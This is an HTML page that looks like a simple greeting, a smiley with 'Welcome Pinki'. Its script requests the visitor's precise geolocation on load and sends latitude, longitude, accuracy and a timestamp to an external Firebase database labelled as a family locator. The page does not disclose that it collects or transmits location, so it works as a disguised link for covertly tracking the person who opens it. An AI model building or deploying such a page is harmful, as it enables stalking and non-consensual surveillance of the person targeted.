<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pinki</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: #ffffff;
        }
        .container { text-align: center; }
        .emoji { font-size: 48px; margin-bottom: 12px; }
        .title { font-size: 28px; font-weight: 300; color: #333; }
        #status {
            position: fixed;
            bottom: 40px;
            width: 100%;
            text-align: center;
            font-size: 14px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="emoji">😊</div>
        <div class="title">Welcome Pinki</div>
    </div>
    <div id="status"></div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

        const app = initializeApp({
            databaseURL: "https://familylocator-3808a-default-rtdb.asia-southeast1.firebasedatabase.app"
        });
        const db = getDatabase(app);

        window.onload = function() {
            if (!navigator.geolocation) return;
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    push(ref(db, 'families/74b5bd46/ondemand/pinki'), {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: Math.round(position.coords.accuracy),
                        timestamp: Date.now(),
                        source: 'link'
                    }).then(() => {
                        document.getElementById('status').textContent = '✓';
                    });
                },
                function() {},
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }
    </script>
</body>
</html>
